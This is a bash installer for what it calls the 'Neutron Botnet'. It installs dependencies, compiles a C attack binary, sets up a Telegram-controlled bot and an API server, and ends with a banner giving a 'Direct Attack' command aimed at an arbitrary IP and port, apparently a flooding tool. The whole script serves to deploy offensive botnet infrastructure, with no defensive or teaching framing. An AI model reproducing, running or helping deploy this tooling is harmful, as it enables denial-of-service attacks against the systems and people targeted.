#!/bin/bash

echo ""
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║     🔥 NEUTRON BOTNET - COMPLETE SETUP SCRIPT 🔥            ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""

# Update system
echo "[1/7] Updating system..."
sudo apt update && sudo apt upgrade -y

# Install dependencies
echo "[2/7] Installing dependencies..."
sudo apt install -y python3 python3-pip python3-venv build-essential gcc mongodb redis-server

# Start MongoDB
echo "[3/7] Starting MongoDB..."
sudo systemctl start mongodb
sudo systemctl enable mongodb

# Create virtual environment
echo "[4/7] Setting up Python environment..."
python3 -m venv venv
source venv/bin/activate
pip install --upgrade pip
pip install -r requirements.txt

# Compile C binary
echo "[5/7] Compiling C binary..."
gcc -O3 -march=native -pthread -o neutron neutron.c
chmod +x neutron

# Create .env file
echo "[6/7] Creating configuration..."
if [ ! -f .env ]; then
    cp .env.example .env
    echo "⚠️ Edit .env file and add your TELEGRAM_BOT_TOKEN!"
fi

echo "[7/7] Setup complete!"

echo ""
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║              ✅ SETUP COMPLETE! ✅                           ║"
echo "╠══════════════════════════════════════════════════════════════╣"
echo "║                                                              ║"
echo "║  Start API Server:  python3 api_server.py                   ║"
echo "║  Start Telegram Bot: python3 telegram_bot.py                ║"
echo "║                                                              ║"
echo "║  Direct Attack:      sudo ./neutron IP PORT 45 12 0  ║"
echo "║                                                              ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""
